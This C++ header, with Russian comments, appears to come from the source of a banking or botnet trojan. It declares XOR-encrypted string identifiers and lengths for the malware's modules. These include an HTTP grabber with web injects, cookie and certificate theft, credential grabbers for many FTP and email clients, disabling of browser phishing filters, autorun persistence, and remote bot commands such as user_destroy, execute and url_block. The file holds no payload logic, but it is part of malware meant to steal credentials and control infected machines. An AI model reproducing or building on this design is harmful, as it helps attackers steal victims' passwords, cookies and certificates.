/*
  Работа с кодироваными строками, этот файл частично генерируется при сборке.
*/
#pragma once

//Макросы для облегчения получения строк.
#define CSTR_GETW(var, id) WCHAR var[CryptedStrings::len_##id]; CryptedStrings::_getW(CryptedStrings::id_##id, var);
#define CSTR_GETA(var, id) char var[CryptedStrings::len_##id]; CryptedStrings::_getA(CryptedStrings::id_##id, var);

namespace CryptedStrings
{
  typedef struct
  {
    unsigned char key;   //XOR ключ строки.
    unsigned short size;  //Размер строки.
    char *encodedString; //Зашифрованная строка.
  }STRINGINFO;
  
  //Список ID строк.
  enum
  {
/*STRINGS_ID_BEGIN*/
    id_userhook_screenshot_path_format,
    id_userhook_screenshot_file_default_prefix,
    id_userhook_screenshot_format,
    id_regpath_autorun,
    id_regpath_profilelist,
    id_regvalue_profilelist_path,
    id_username_sam_unknown,
    id_core_uninstall_batch,
#if(BO_WININET > 0 || BO_NSPR4 > 0)
    id_httpgrabber_inject_path_format,
    id_httpgrabber_inject_grabbed_format,
    id_httpgrabber_report_format,
    id_httpgrabber_report_empty,
    id_httpgrabber_report_unknown,
    id_httpgrabber_report_blocked,
    id_httpgrabber_request_ct,
    id_httpgrabber_request_zcid,
    id_httpgrabber_urlencoded,
    id_httpgrabber_auth_normal,
    id_httpgrabber_auth_encoded,
#endif
#if(BO_SOCKET_FTP > 0 || BO_SOCKET_POP3 > 0)
    id_sockethook_report_format,
    id_sockethook_report_prefix_ftp,
    id_sockethook_report_prefix_pop3,
    id_sockethook_user_anonymous,
#endif
#if(BO_WININET > 0)
    id_regpath_ie_startpage,
    id_regvalue_ie_startpage,
    id_regpath_ie_phishingfilter,
    id_regvalue_ie_phishingfilter1,
    id_regvalue_ie_phishingfilter2,
    id_regpath_ie_privacy,
    id_regvalue_ie_privacy_cookies,
    id_regpath_ie_zones,
    id_regpath_ie_zones_1406,
    id_regpath_ie_zones_1609,
    id_wininethook_http_acceptencoding,
    id_wininethook_http_te,
    id_wininethook_http_ifmodified,
    id_wininethook_report_cookie_path,
    id_wininethook_report_cookie_data,
    id_file_wininet_cookie_mask,
    id_path_wininet_cookie_low,
    id_wininethook_report_cookies,
    id_wininethook_report_cookies_empty,
#endif
#if(BO_NSPR4 > 0)
    id_nspr4_firefox_home_path,
    id_nspr4_firefox_file_userjs,
    id_nspr4_firefox_file_profiles,
    id_nspr4_firefox_profile_id_format,
    id_nspr4_firefox_profile_relative,
    id_nspr4_firefox_profile_path,
    id_nspr4_firefox_prefs_security,
    id_nspr4_firefox_prefs_homepage,
#endif
    id_softwaregrabber_flashplayer_path,
    id_softwaregrabber_flashplayer_archive,
    id_softwaregrabber_flashplayer_mask,
#if(BO_SOFTWARE_EMAIL > 0)
    id_softwaregrabber_wab_title,
    id_softwaregrabber_wab_regkey,
    id_softwaregrabber_wab_wabopen,
    id_softwaregrabber_wc_title,
    id_softwaregrabber_wc_init_name,
    id_softwaregrabber_wc_init_version,
    id_softwaregrabber_wc_property_format,
    id_softwaregrabber_windows_mail_recips_title,
    id_softwaregrabber_outlook_express_recips_title,
    id_softwaregrabber_outlook_express_title,
    id_softwaregrabber_windows_mail_file_1,
    id_softwaregrabber_windows_mail_regkey,
    id_softwaregrabber_windows_live_mail_regkey,
    id_softwaregrabber_windows_mail_regvalue_path,
    id_softwaregrabber_windows_mail_regvalue_salt,
    id_softwaregrabber_windows_mail_to_port,
    id_softwaregrabber_windows_mail_title,
    id_softwaregrabber_windows_live_mail_title,
    id_softwaregrabber_windows_mail_xml_root,
    id_softwaregrabber_windows_mail_xml_name,
    id_softwaregrabber_windows_mail_xml_email,
    id_softwaregrabber_account_title,
    id_softwaregrabber_account_server_info,
    id_softwaregrabber_account_server_x_server,
    id_softwaregrabber_account_server_x_username,
    id_softwaregrabber_account_server_x_password,
    id_softwaregrabber_account_server_x_port,
    id_softwaregrabber_account_server_x_ssl,
    id_softwaregrabber_account_server_smtp,
    id_softwaregrabber_account_server_pop3,
    id_softwaregrabber_account_server_imap,
    id_softwaregrabber_account_server_ssl,
#endif
#if(BO_SOFTWARE_FTP > 0)
    id_softwaregrabber_ftp_report_format1W,
    id_softwaregrabber_ftp_report_format2W,
    id_softwaregrabber_ftp_report_format1A,
    id_softwaregrabber_flashfxp_secret,
    id_softwaregrabber_flashfxp_file_1,
    id_softwaregrabber_flashfxp_file_2,
    id_softwaregrabber_flashfxp_file_3,
    id_softwaregrabber_flashfxp_host,
    id_softwaregrabber_flashfxp_port,
    id_softwaregrabber_flashfxp_user,
    id_softwaregrabber_flashfxp_pass,
    id_softwaregrabber_flashfxp_regkey,
    id_softwaregrabber_flashfxp_regvalue,
    id_softwaregrabber_flashfxp_path_mask,
    id_softwaregrabber_flashfxp_title,
    id_softwaregrabber_tc_file_1,
    id_softwaregrabber_tc_section_bad_1,
    id_softwaregrabber_tc_section_bad_2,
    id_softwaregrabber_tc_host,
    id_softwaregrabber_tc_user,
    id_softwaregrabber_tc_pass,
    id_softwaregrabber_tc_regkey,
    id_softwaregrabber_tc_regvalue_ftp,
    id_softwaregrabber_tc_regvalue_dir,
    id_softwaregrabber_tc_path_mask_1,
    id_softwaregrabber_tc_path_mask_2,
    id_softwaregrabber_tc_path_mask_3,
    id_softwaregrabber_tc_title,
    id_softwaregrabber_wsftp_file_1,
    id_softwaregrabber_wsftp_section_bad_1,
    id_softwaregrabber_wsftp_host,
    id_softwaregrabber_wsftp_port,
    id_softwaregrabber_wsftp_user,
    id_softwaregrabber_wsftp_pass,
    id_softwaregrabber_wsftp_regkey,
    id_softwaregrabber_wsftp_regvalue,
    id_softwaregrabber_wsftp_path_mask_1,
    id_softwaregrabber_wsftp_title,
    id_softwaregrabber_filezilla_file_mask_1,
    id_softwaregrabber_filezilla_node_mask,
    id_softwaregrabber_filezilla_host,
    id_softwaregrabber_filezilla_port,
    id_softwaregrabber_filezilla_user,
    id_softwaregrabber_filezilla_pass,
    id_softwaregrabber_filezilla_path_mask_1,
    id_softwaregrabber_filezilla_title,
    id_softwaregrabber_far_regkey_1,
    id_softwaregrabber_far_regkey_2,
    id_softwaregrabber_far_host,
    id_softwaregrabber_far_user_1,
    id_softwaregrabber_far_user_2,
    id_softwaregrabber_far_pass,
    id_softwaregrabber_far_title,
    id_softwaregrabber_winscp_regkey,
    id_softwaregrabber_winscp_host,
    id_softwaregrabber_winscp_port,
    id_softwaregrabber_winscp_user,
    id_softwaregrabber_winscp_pass,
    id_softwaregrabber_winscp_title,
    id_softwaregrabber_fc_file_1,
    id_softwaregrabber_fc_host,
    id_softwaregrabber_fc_port,
    id_softwaregrabber_fc_user,
    id_softwaregrabber_fc_pass,
    id_softwaregrabber_fc_path_mask_1,
    id_softwaregrabber_fc_title,
    id_softwaregrabber_coreftp_regkey,
    id_softwaregrabber_coreftp_host,
    id_softwaregrabber_coreftp_port,
    id_softwaregrabber_coreftp_user,
    id_softwaregrabber_coreftp_pass,
    id_softwaregrabber_coreftp_title,
    id_softwaregrabber_smartftp_file_mask_1,
    id_softwaregrabber_smartftp_node,
    id_softwaregrabber_smartftp_host,
    id_softwaregrabber_smartftp_port,
    id_softwaregrabber_smartftp_user,
    id_softwaregrabber_smartftp_pass,
    id_softwaregrabber_smartftp_regkey_1,
    id_softwaregrabber_smartftp_regvalue_1,
    id_softwaregrabber_smartftp_regkey_2,
    id_softwaregrabber_smartftp_regvalue_2,
    id_softwaregrabber_smartftp_title,
#endif
#if(BO_VNC > 0)
    id_vnc_rootprocess,
#endif
    id_certstore_export_password,
    id_certstore_export_remote_path,
    id_certstore_export_prolog,
    id_remotescript_command_os_shutdown,
    id_remotescript_command_os_reboot,
    id_remotescript_command_bot_uninstall,
    id_remotescript_command_bot_update,
#if(BO_BCSERVER_PLATFORMS > 0)
    id_remotescript_command_bot_bc_add,
    id_remotescript_command_bot_bc_remove,
#endif
    id_remotescript_command_bot_httpinject_disable,
    id_remotescript_command_bot_httpinject_enable,
    id_remotescript_command_fs_path_get,
    id_remotescript_command_fs_search_add,
    id_remotescript_command_fs_search_remove,
    id_remotescript_command_user_destroy,
    id_remotescript_command_user_logoff,
    id_remotescript_command_user_execute,
#if(BO_WININET > 0 || BO_NSPR4 > 0)
    id_remotescript_command_user_cookies_get,
    id_remotescript_command_user_cookies_remove,
#endif
    id_remotescript_command_user_certs_get,
    id_remotescript_command_user_certs_remove,
#if(BO_WININET > 0 || BO_NSPR4 > 0)
    id_remotescript_command_user_url_block,
    id_remotescript_command_user_url_unblock,
#endif
#if(BO_WININET > 0 || BO_NSPR4 > 0)
    id_remotescript_command_user_homepage_set,
#endif
#if(BO_SOFTWARE_FTP > 0)
    id_remotescript_command_user_ftpclients_get,
#endif
#if(BO_SOFTWARE_EMAIL > 0)
    id_remotescript_command_user_emailclients_get,
#endif
    id_remotescript_command_user_flashplayer_get,
    id_remotescript_command_user_flashplayer_remove,
    id_remotescript_error_not_enough_memory,
    id_remotescript_error_already_executed,
    id_remotescript_error_failed_to_load,
    id_remotescript_error_failed_to_save,
    id_remotescript_error_command_failed,
    id_remotescript_error_command_unknown,
    id_remotescript_error_success,
#if(BO_VNC > 0)
    id_windowstation_winstation_0,
    id_windowstation_desktop_default,
#endif
    id_core_pr_dwm,
    id_core_pr_taskhost,
    id_core_pr_taskeng,
    id_core_pr_wscntfy,
    id_core_pr_ctfmon,
    id_core_pr_rdpclip,
    id_core_pr_explorer,
    id_core_infobox_botinfo,
    id_core_infobox_crypt_protection,
    id_core_botid_regkey,
    id_core_botid_regvalue_1,
    id_core_botid_regvalue_2,
    id_core_botid_format,
    id_core_botid_format_error,
    id_core_botid_unknown,
    id_module_wtsapi32,
    id_wtsapi32_enumeratesessions,
    id_wtsapi32_freememory,
    id_wtsapi32_queryusertoken,
    id_module_userenv,
    id_userenv_getdefuserprofiledir,
    id_module_user32,
    id_user32_messagebox,
    id_module_ntdll,
    id_count
/*STRINGS_ID_END*/
  };
  
  //Список размеров строк.
  enum
  {
/*STRINGS_LENGHT_BEGIN*/
    len_userhook_screenshot_path_format = (28 + 1),
    len_userhook_screenshot_file_default_prefix = (7 + 1),
    len_userhook_screenshot_format = (10 + 1),
    len_regpath_autorun = (45 + 1),
    len_regpath_profilelist = (59 + 1),
    len_regvalue_profilelist_path = (16 + 1),
    len_username_sam_unknown = (15 + 1),
    len_core_uninstall_batch = (76 + 1),
#if(BO_WININET > 0 || BO_NSPR4 > 0)
    len_httpgrabber_inject_path_format = (29 + 1),
    len_httpgrabber_inject_grabbed_format = (25 + 1),
    len_httpgrabber_report_format = (48 + 1),
    len_httpgrabber_report_empty = (7 + 1),
    len_httpgrabber_report_unknown = (9 + 1),
    len_httpgrabber_report_blocked = (10 + 1),
    len_httpgrabber_request_ct = (18 + 1),
    len_httpgrabber_request_zcid = (10 + 1),
    len_httpgrabber_urlencoded = (33 + 1),
    len_httpgrabber_auth_normal = (50 + 1),
    len_httpgrabber_auth_encoded = (34 + 1),
#endif
#if(BO_SOCKET_FTP > 0 || BO_SOCKET_POP3 > 0)
    len_sockethook_report_format = (14 + 1),
    len_sockethook_report_prefix_ftp = (3 + 1),
    len_sockethook_report_prefix_pop3 = (4 + 1),
    len_sockethook_user_anonymous = (9 + 1),
#endif
#if(BO_WININET > 0)
    len_regpath_ie_startpage = (41 + 1),
    len_regvalue_ie_startpage = (10 + 1),
    len_regpath_ie_phishingfilter = (51 + 1),
    len_regvalue_ie_phishingfilter1 = (7 + 1),
    len_regvalue_ie_phishingfilter2 = (9 + 1),
    len_regpath_ie_privacy = (44 + 1),
    len_regvalue_ie_privacy_cookies = (12 + 1),
    len_regpath_ie_zones = (68 + 1),
    len_regpath_ie_zones_1406 = (4 + 1),
    len_regpath_ie_zones_1609 = (4 + 1),
    len_wininethook_http_acceptencoding = (27 + 1),
    len_wininethook_http_te = (5 + 1),
    len_wininethook_http_ifmodified = (20 + 1),
    len_wininethook_report_cookie_path = (10 + 1),
    len_wininethook_report_cookie_data = (6 + 1),
    len_file_wininet_cookie_mask = (7 + 1),
    len_path_wininet_cookie_low = (3 + 1),
    len_wininethook_report_cookies = (38 + 1),
    len_wininethook_report_cookies_empty = (5 + 1),
#endif
#if(BO_NSPR4 > 0)
    len_nspr4_firefox_home_path = (15 + 1),
    len_nspr4_firefox_file_userjs = (7 + 1),
    len_nspr4_firefox_file_profiles = (12 + 1),
    len_nspr4_firefox_profile_id_format = (9 + 1),
    len_nspr4_firefox_profile_relative = (10 + 1),
    len_nspr4_firefox_profile_path = (4 + 1),
    len_nspr4_firefox_prefs_security = (326 + 1),
    len_nspr4_firefox_prefs_homepage = (85 + 1),
#endif
    len_softwaregrabber_flashplayer_path = (23 + 1),
    len_softwaregrabber_flashplayer_archive = (15 + 1),
    len_softwaregrabber_flashplayer_mask = (5 + 1),
#if(BO_SOFTWARE_EMAIL > 0)
    len_softwaregrabber_wab_title = (20 + 1),
    len_softwaregrabber_wab_regkey = (30 + 1),
    len_softwaregrabber_wab_wabopen = (7 + 1),
    len_softwaregrabber_wc_title = (16 + 1),
    len_softwaregrabber_wc_init_name = (6 + 1),
    len_softwaregrabber_wc_init_version = (3 + 1),
    len_softwaregrabber_wc_property_format = (47 + 1),
    len_softwaregrabber_windows_mail_recips_title = (23 + 1),
    len_softwaregrabber_outlook_express_recips_title = (26 + 1),
    len_softwaregrabber_outlook_express_title = (15 + 1),
    len_softwaregrabber_windows_mail_file_1 = (20 + 1),
    len_softwaregrabber_windows_mail_regkey = (31 + 1),
    len_softwaregrabber_windows_live_mail_regkey = (36 + 1),
    len_softwaregrabber_windows_mail_regvalue_path = (10 + 1),
    len_softwaregrabber_windows_mail_regvalue_salt = (4 + 1),
    len_softwaregrabber_windows_mail_to_port = (4 + 1),
    len_softwaregrabber_windows_mail_title = (12 + 1),
    len_softwaregrabber_windows_live_mail_title = (17 + 1),
    len_softwaregrabber_windows_mail_xml_root = (14 + 1),
    len_softwaregrabber_windows_mail_xml_name = (12 + 1),
    len_softwaregrabber_windows_mail_xml_email = (18 + 1),
    len_softwaregrabber_account_title = (30 + 1),
    len_softwaregrabber_account_server_info = (49 + 1),
    len_softwaregrabber_account_server_x_server = (9 + 1),
    len_softwaregrabber_account_server_x_username = (12 + 1),
    len_softwaregrabber_account_server_x_password = (12 + 1),
    len_softwaregrabber_account_server_x_port = (7 + 1),
    len_softwaregrabber_account_server_x_ssl = (20 + 1),
    len_softwaregrabber_account_server_smtp = (4 + 1),
    len_softwaregrabber_account_server_pop3 = (4 + 1),
    len_softwaregrabber_account_server_imap = (4 + 1),
    len_softwaregrabber_account_server_ssl = (6 + 1),
#endif
#if(BO_SOFTWARE_FTP > 0)
    len_softwaregrabber_ftp_report_format1W = (18 + 1),
    len_softwaregrabber_ftp_report_format2W = (15 + 1),
    len_softwaregrabber_ftp_report_format1A = (18 + 1),
    len_softwaregrabber_flashfxp_secret = (28 + 1),
    len_softwaregrabber_flashfxp_file_1 = (9 + 1),
    len_softwaregrabber_flashfxp_file_2 = (9 + 1),
    len_softwaregrabber_flashfxp_file_3 = (11 + 1),
    len_softwaregrabber_flashfxp_host = (2 + 1),
    len_softwaregrabber_flashfxp_port = (4 + 1),
    len_softwaregrabber_flashfxp_user = (4 + 1),
    len_softwaregrabber_flashfxp_pass = (4 + 1),
    len_softwaregrabber_flashfxp_regkey = (19 + 1),
    len_softwaregrabber_flashfxp_regvalue = (10 + 1),
    len_softwaregrabber_flashfxp_path_mask = (10 + 1),
    len_softwaregrabber_flashfxp_title = (8 + 1),
    len_softwaregrabber_tc_file_1 = (11 + 1),
    len_softwaregrabber_tc_section_bad_1 = (11 + 1),
    len_softwaregrabber_tc_section_bad_2 = (7 + 1),
    len_softwaregrabber_tc_host = (4 + 1),
    len_softwaregrabber_tc_user = (8 + 1),
    len_softwaregrabber_tc_pass = (8 + 1),
    len_softwaregrabber_tc_regkey = (32 + 1),
    len_softwaregrabber_tc_regvalue_ftp = (10 + 1),
    len_softwaregrabber_tc_regvalue_dir = (10 + 1),
    len_softwaregrabber_tc_path_mask_1 = (10 + 1),
    len_softwaregrabber_tc_path_mask_2 = (17 + 1),
    len_softwaregrabber_tc_path_mask_3 = (9 + 1),
    len_softwaregrabber_tc_title = (15 + 1),
    len_softwaregrabber_wsftp_file_1 = (10 + 1),
    len_softwaregrabber_wsftp_section_bad_1 = (8 + 1),
    len_softwaregrabber_wsftp_host = (4 + 1),
    len_softwaregrabber_wsftp_port = (4 + 1),
    len_softwaregrabber_wsftp_user = (3 + 1),
    len_softwaregrabber_wsftp_pass = (3 + 1),
    len_softwaregrabber_wsftp_regkey = (24 + 1),
    len_softwaregrabber_wsftp_regvalue = (7 + 1),
    len_softwaregrabber_wsftp_path_mask_1 = (10 + 1),
    len_softwaregrabber_wsftp_title = (6 + 1),
    len_softwaregrabber_filezilla_file_mask_1 = (5 + 1),
    len_softwaregrabber_filezilla_node_mask = (11 + 1),
    len_softwaregrabber_filezilla_host = (4 + 1),
    len_softwaregrabber_filezilla_port = (4 + 1),
    len_softwaregrabber_filezilla_user = (4 + 1),
    len_softwaregrabber_filezilla_pass = (4 + 1),
    len_softwaregrabber_filezilla_path_mask_1 = (11 + 1),
    len_softwaregrabber_filezilla_title = (9 + 1),
    len_softwaregrabber_far_regkey_1 = (30 + 1),
    len_softwaregrabber_far_regkey_2 = (31 + 1),
    len_softwaregrabber_far_host = (8 + 1),
    len_softwaregrabber_far_user_1 = (8 + 1),
    len_softwaregrabber_far_user_2 = (4 + 1),
    len_softwaregrabber_far_pass = (8 + 1),
    len_softwaregrabber_far_title = (11 + 1),
    len_softwaregrabber_winscp_regkey = (41 + 1),
    len_softwaregrabber_winscp_host = (8 + 1),
    len_softwaregrabber_winscp_port = (10 + 1),
    len_softwaregrabber_winscp_user = (8 + 1),
    len_softwaregrabber_winscp_pass = (8 + 1),
    len_softwaregrabber_winscp_title = (6 + 1),
    len_softwaregrabber_fc_file_1 = (11 + 1),
    len_softwaregrabber_fc_host = (8 + 1),
    len_softwaregrabber_fc_port = (6 + 1),
    len_softwaregrabber_fc_user = (6 + 1),
    len_softwaregrabber_fc_pass = (10 + 1),
    len_softwaregrabber_fc_path_mask_1 = (14 + 1),
    len_softwaregrabber_fc_title = (13 + 1),
    len_softwaregrabber_coreftp_regkey = (30 + 1),
    len_softwaregrabber_coreftp_host = (4 + 1),
    len_softwaregrabber_coreftp_port = (4 + 1),
    len_softwaregrabber_coreftp_user = (4 + 1),
    len_softwaregrabber_coreftp_pass = (2 + 1),
    len_softwaregrabber_coreftp_title = (7 + 1),
    len_softwaregrabber_smartftp_file_mask_1 = (5 + 1),
    len_softwaregrabber_smartftp_node = (12 + 1),
    len_softwaregrabber_smartftp_host = (4 + 1),
    len_softwaregrabber_smartftp_port = (4 + 1),
    len_softwaregrabber_smartftp_user = (4 + 1),
    len_softwaregrabber_smartftp_pass = (8 + 1),
    len_softwaregrabber_smartftp_regkey_1 = (55 + 1),
    len_softwaregrabber_smartftp_regvalue_1 = (18 + 1),
    len_softwaregrabber_smartftp_regkey_2 = (44 + 1),
    len_softwaregrabber_smartftp_regvalue_2 = (6 + 1),
    len_softwaregrabber_smartftp_title = (8 + 1),
#endif
#if(BO_VNC > 0)
    len_vnc_rootprocess = (12 + 1),
#endif
    len_certstore_export_password = (4 + 1),
    len_certstore_export_remote_path = (30 + 1),
    len_certstore_export_prolog = (7 + 1),
    len_remotescript_command_os_shutdown = (11 + 1),
    len_remotescript_command_os_reboot = (9 + 1),
    len_remotescript_command_bot_uninstall = (13 + 1),
    len_remotescript_command_bot_update = (10 + 1),
#if(BO_BCSERVER_PLATFORMS > 0)
    len_remotescript_command_bot_bc_add = (10 + 1),
    len_remotescript_command_bot_bc_remove = (13 + 1),
#endif
    len_remotescript_command_bot_httpinject_disable = (22 + 1),
    len_remotescript_command_bot_httpinject_enable = (21 + 1),
    len_remotescript_command_fs_path_get = (11 + 1),
    len_remotescript_command_fs_search_add = (13 + 1),
    len_remotescript_command_fs_search_remove = (16 + 1),
    len_remotescript_command_user_destroy = (12 + 1),
    len_remotescript_command_user_logoff = (11 + 1),
    len_remotescript_command_user_execute = (12 + 1),
#if(BO_WININET > 0 || BO_NSPR4 > 0)
    len_remotescript_command_user_cookies_get = (16 + 1),
    len_remotescript_command_user_cookies_remove = (19 + 1),
#endif
    len_remotescript_command_user_certs_get = (14 + 1),
    len_remotescript_command_user_certs_remove = (17 + 1),
#if(BO_WININET > 0 || BO_NSPR4 > 0)
    len_remotescript_command_user_url_block = (14 + 1),
    len_remotescript_command_user_url_unblock = (16 + 1),
#endif
#if(BO_WININET > 0 || BO_NSPR4 > 0)
    len_remotescript_command_user_homepage_set = (17 + 1),
#endif
#if(BO_SOFTWARE_FTP > 0)
    len_remotescript_command_user_ftpclients_get = (19 + 1),
#endif
#if(BO_SOFTWARE_EMAIL > 0)
    len_remotescript_command_user_emailclients_get = (21 + 1),
#endif
    len_remotescript_command_user_flashplayer_get = (20 + 1),
    len_remotescript_command_user_flashplayer_remove = (23 + 1),
    len_remotescript_error_not_enough_memory = (18 + 1),
    len_remotescript_error_already_executed = (24 + 1),
    len_remotescript_error_failed_to_load = (35 + 1),
    len_remotescript_error_failed_to_save = (35 + 1),
    len_remotescript_error_command_failed = (37 + 1),
    len_remotescript_error_command_unknown = (27 + 1),
    len_remotescript_error_success = (3 + 1),
#if(BO_VNC > 0)
    len_windowstation_winstation_0 = (7 + 1),
    len_windowstation_desktop_default = (7 + 1),
#endif
    len_core_pr_dwm = (7 + 1),
    len_core_pr_taskhost = (12 + 1),
    len_core_pr_taskeng = (11 + 1),
    len_core_pr_wscntfy = (11 + 1),
    len_core_pr_ctfmon = (10 + 1),
    len_core_pr_rdpclip = (11 + 1),
    len_core_pr_explorer = (12 + 1),
    len_core_infobox_botinfo = (23 + 1),
    len_core_infobox_crypt_protection = (16 + 1),
    len_core_botid_regkey = (44 + 1),
    len_core_botid_regvalue_1 = (11 + 1),
    len_core_botid_regvalue_2 = (16 + 1),
    len_core_botid_format = (11 + 1),
    len_core_botid_format_error = (11 + 1),
    len_core_botid_unknown = (7 + 1),
    len_module_wtsapi32 = (12 + 1),
    len_wtsapi32_enumeratesessions = (21 + 1),
    len_wtsapi32_freememory = (13 + 1),
    len_wtsapi32_queryusertoken = (17 + 1),
    len_module_userenv = (11 + 1),
    len_userenv_getdefuserprofiledir = (31 + 1),
    len_module_user32 = (10 + 1),
    len_user32_messagebox = (11 + 1),
    len_module_ntdll = (9 + 1),
    len_max = (326 + 1)
/*STRINGS_LENGHT_END*/
  };

  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);

  /*
    Получение строки как ANSI.

    IN id      - id_*.
    OUT buffer - буффер.
  */
  void _getA(WORD id, LPSTR buffer);

  /*
    Получение строки как Unicode.

    IN id      - id_*.
    OUT buffer - буффер.
  */
  void _getW(WORD id, LPWSTR buffer);
};
